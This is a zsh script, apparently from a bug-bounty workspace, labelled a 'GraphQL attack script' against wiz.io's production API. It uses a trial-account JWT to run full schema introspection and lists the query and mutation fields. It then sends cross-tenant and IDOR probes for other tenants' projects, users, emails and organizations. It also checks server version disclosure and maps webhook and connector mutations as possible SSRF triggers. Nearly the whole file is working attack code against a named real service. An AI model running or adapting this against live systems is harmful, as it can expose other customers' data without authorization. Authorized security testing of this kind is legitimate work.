#!/usr/bin/env zsh
# GraphQL attack script — wiz.io API
# Requires: JWT from trial account (browser DevTools → any request → Authorization header)
# Usage: JWT="eyJ..." zsh ~/bug-bounty-hunting-/scripts/graphql-attack-wiz.sh

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin

if [ -z "$JWT" ]; then
  echo "Usage: JWT='eyJ...' zsh $0"
  echo "Get JWT: open app.wiz.io → DevTools → Network → any XHR → copy Authorization header value"
  exit 1
fi

RESULTS=~/bug-bounty-hunting-/results/wiz.io/03-vulns
mkdir -p "$RESULTS"

# Try both tenant-specific and generic endpoint
for API in "https://api.us1.app.wiz.io/graphql" "https://api.app.wiz.io/graphql"; do
  echo "--- Testing $API ---"
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 10 -X POST "$API" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $JWT" \
    -d '{"query":"{ __typename }"}' 2>/dev/null)
  echo "Status: $code"
  [ "$code" = "200" ] && { GQL_API="$API"; break; }
done

if [ -z "$GQL_API" ]; then
  echo "No working GraphQL API found with provided JWT. Check tenant region."
  exit 1
fi
echo "Working GraphQL API: $GQL_API"

gql() {
  curl -sk --connect-timeout 15 -X POST "$GQL_API" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $JWT" \
    -d "$1" 2>/dev/null
}

# ---------------------------------------------------------------
# 1. Full introspection — save raw schema
# ---------------------------------------------------------------
echo ""
echo "=== FULL SCHEMA INTROSPECTION ==="
gql '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields(includeDeprecated: true) { name description type { name kind ofType { name kind } } args { name type { name kind ofType { name kind } } } } inputFields { name type { name kind } } } directives { name } } }"}' \
  > "$RESULTS/graphql-schema.json"
echo "Schema saved: $RESULTS/graphql-schema.json ($(wc -c < $RESULTS/graphql-schema.json) bytes)"

# Extract type names
echo ""
echo "=== ALL TYPES ==="
python3 -c "
import json, sys
d = json.load(open('$RESULTS/graphql-schema.json'))
types = d.get('data',{}).get('__schema',{}).get('types',[])
for t in types:
  if not t['name'].startswith('__'):
    print(t['kind'].ljust(15), t['name'])
" 2>/dev/null | sort | tee "$RESULTS/graphql-types.txt"

# Extract query fields (attack surface)
echo ""
echo "=== ROOT QUERY FIELDS ==="
python3 -c "
import json
d = json.load(open('$RESULTS/graphql-schema.json'))
schema = d.get('data',{}).get('__schema',{})
qname = schema.get('queryType',{}).get('name','Query')
for t in schema.get('types',[]):
  if t['name'] == qname:
    for f in (t.get('fields') or []):
      print(f['name'])
" 2>/dev/null | sort | tee "$RESULTS/graphql-queries.txt"

# Extract mutation fields
echo ""
echo "=== ROOT MUTATION FIELDS ==="
python3 -c "
import json
d = json.load(open('$RESULTS/graphql-schema.json'))
schema = d.get('data',{}).get('__schema',{})
mname = (schema.get('mutationType') or {}).get('name','Mutation')
if not mname: print('No mutations'); exit()
for t in schema.get('types',[]):
  if t['name'] == mname:
    for f in (t.get('fields') or []):
      print(f['name'])
" 2>/dev/null | sort | tee "$RESULTS/graphql-mutations.txt"

# ---------------------------------------------------------------
# 2. Cross-tenant / IDOR probes on key query types
# ---------------------------------------------------------------
echo ""
echo "=== CROSS-TENANT PROBE — projects (no tenant filter) ==="
gql '{"query":"{ projects(first: 5) { nodes { id name } } }"}' \
  | python3 -m json.tool 2>/dev/null | head -40

echo ""
echo "=== CROSS-TENANT PROBE — users ==="
gql '{"query":"{ users(first: 5) { nodes { id email name } } }"}' \
  | python3 -m json.tool 2>/dev/null | head -40

echo ""
echo "=== CROSS-TENANT PROBE — organizations (should only return own) ==="
gql '{"query":"{ organizations { id name subscriptionTier } }"}' \
  | python3 -m json.tool 2>/dev/null | head -30

echo ""
echo "=== SERVER INFO / VERSION DISCLOSURE ==="
gql '{"query":"{ serverInfo { version buildDate } }"}' \
  | python3 -m json.tool 2>/dev/null | head -10

# ---------------------------------------------------------------
# 3. Dangerous mutations — test only for authorization (no execution)
# ---------------------------------------------------------------
echo ""
echo "=== MUTATION AUTH CHECK — createWebhook (SSRF trigger) ==="
# This checks if the mutation field EXISTS and what args it requires
# NOT executing — just auth probing
gql '{"query":"{ __type(name: \"Mutation\") { fields { name args { name type { name kind ofType { name kind } } } } } }"}' \
  | python3 -c "
import json,sys
d=json.load(sys.stdin)
fields = (d.get('data',{}).get('__type') or {}).get('fields') or []
targets = ['createWebhook','updateWebhook','createConnector','updateConnector','createIntegration']
for f in fields:
  if any(t in f['name'] for t in targets):
    print('FOUND:', f['name'])
    for a in (f.get('args') or []):
      print('  arg:', a['name'], '->', a.get('type',{}).get('name') or a.get('type',{}).get('ofType',{}).get('name',''))
" 2>/dev/null

echo ""
echo "=== COMPLETE — check $RESULTS/ for all output ==="
ls -la "$RESULTS/"
